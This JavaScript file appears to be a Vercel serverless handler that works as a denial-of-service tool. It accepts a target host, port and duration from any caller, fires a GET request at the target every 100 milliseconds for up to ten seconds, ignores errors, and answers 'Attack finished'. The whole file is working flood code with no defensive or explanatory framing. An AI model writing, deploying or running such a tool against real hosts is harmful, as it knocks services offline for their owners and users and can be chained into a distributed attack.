import http from 'http';
import https from 'https';

export default async function handler(req, res) {
  if (req.method === 'POST' || req.method === 'GET') {
    const params = req.method === 'POST' ? req.body : req.query;
    const { target, time, port } = params;

    if (!target || !time || !port) {
      return res.status(400).json({ error: 'Missing parameters' });
    }

    try {
      const targetUrl = new URL(target.includes('://') ? target : `http://${target}`);
      const protocol = targetUrl.protocol === 'https:' ? 'https' : 'http';
      const host = targetUrl.hostname;
      const path = targetUrl.pathname || '/';

      const attackTime = Math.min(parseInt(time, 10), 10); // Max 10s (Vercel limit)
      const attackPort = parseInt(port, 10) || (protocol === 'https' ? 443 : 80);

      const sendRequest = () => {
        const options = {
          hostname: host,
          port: attackPort,
          path: path,
          method: 'GET',
          timeout: 2000,
        };

        const client = protocol === 'https' ? https : http;
        const req = client.request(options);
        req.on('error', () => {});
        req.end();
      };

      const interval = setInterval(sendRequest, 100);
      setTimeout(() => {
        clearInterval(interval);
        res.status(200).send('Attack finished');
      }, attackTime * 1000);

    } catch (error) {
      res.status(500).json({ error: 'Invalid target URL' });
    }
  } else {
    res.status(405).send('Method not allowed');
  }
}
